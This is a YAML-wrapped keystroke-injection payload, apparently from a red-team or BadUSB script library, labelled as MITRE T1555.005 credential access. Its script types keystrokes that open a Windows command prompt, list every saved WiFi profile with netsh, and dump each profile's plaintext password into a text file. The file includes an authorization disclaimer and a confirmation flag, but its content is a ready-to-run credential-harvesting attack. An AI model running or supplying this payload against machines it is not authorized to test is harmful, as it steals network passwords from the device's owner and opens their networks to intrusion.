name: wifi-passwords
description: "Extracts saved WiFi profile names and their plaintext passwords using netsh"
author: TiltedLunar123
version: "1.0"
mitre:
  tactic: Credential Access
  technique: T1555.005
platform: windows
parameters:
  - name: output_file
    type: string
    default: "wifi_creds.txt"
    description: "Filename to write extracted WiFi credentials to"
  - name: delay_ms
    type: integer
    default: 500
    description: "Delay in milliseconds between keystrokes"
safety:
  requires_confirmation: true
  scope_note: "Only use on systems you own or have written authorization to test"
script: |
  REM -----------------------------------------------
  REM WiFi Password Extraction (T1555.005)
  REM Enumerates saved wireless profiles and dumps
  REM stored passwords via netsh wlan commands
  REM WARNING: Authorized use only
  REM -----------------------------------------------
  DELAY 3000
  DELAY {{ delay_ms }}
  GUI r
  DELAY 500
  STRING cmd /k
  ENTER
  DELAY 500
  DELAY {{ delay_ms }}
  STRING echo === Saved WiFi Credentials === > {{ output_file }}
  ENTER
  DELAY {{ delay_ms }}
  STRING netsh wlan show profiles >> {{ output_file }}
  ENTER
  DELAY {{ delay_ms }}
  STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profile"') do @netsh wlan show profile name=%a key=clear >> {{ output_file }}
  ENTER
  DELAY {{ delay_ms }}
  STRING echo === End of WiFi Credentials === >> {{ output_file }}
  ENTER
  DELAY {{ delay_ms }}
  STRING exit
  ENTER
